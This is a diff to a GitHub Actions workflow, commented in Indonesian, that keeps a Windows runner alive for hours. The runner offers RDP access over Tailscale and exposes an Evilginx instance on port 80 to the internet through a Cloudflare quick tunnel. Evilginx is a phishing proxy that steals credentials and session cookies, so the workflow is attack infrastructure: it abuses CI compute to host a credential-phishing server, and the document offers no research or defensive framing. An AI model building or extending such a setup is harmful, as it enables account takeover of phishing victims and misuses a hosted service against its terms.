@@ -66,7 +66,9 @@ jobs:
 
       - name: Final Setup & Maintain Connection
         run: |
+          # Ambil IP Tailscale untuk diinfokan ke log
           $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
+          
           Write-Host "`n==============================================="
           Write-Host "✅ RDP READY!"
           Write-Host "Address: $tsIP"
@@ -75,12 +77,13 @@ jobs:
           Write-Host "Evilginx Path: $env:EVIL_PATH"
           Write-Host "===============================================`n"
           
-          # Menjalankan Cloudflare Quick Tunnel agar port 80 bisa diakses via domain sementara
+          # Menjalankan Cloudflare Quick Tunnel (Port 80 untuk Evilginx)
+          # Link .trycloudflare.com akan muncul di log GitHub Actions
           Start-Process -FilePath "C:\Program Files (x86)\cloudflared\cloudflared.exe" -ArgumentList "tunnel", "--url", "http://localhost:80" -NoNewWindow
 
-          # Loop untuk menjaga runner tetap hidup
+          # Loop untuk menjaga runner tetap hidup selama 6 jam (batas GitHub)
           while ($true) {
               $currentTime = Get-Date -Format "HH:mm:ss"
-              Write-Host "[$currentTime] Runner Active & Tunneling..."
+              Write-Host "[$currentTime] Runner Active & Tunneling... Masuk ke RDP via Tailscale IP!"
               Start-Sleep -Seconds 300
           }
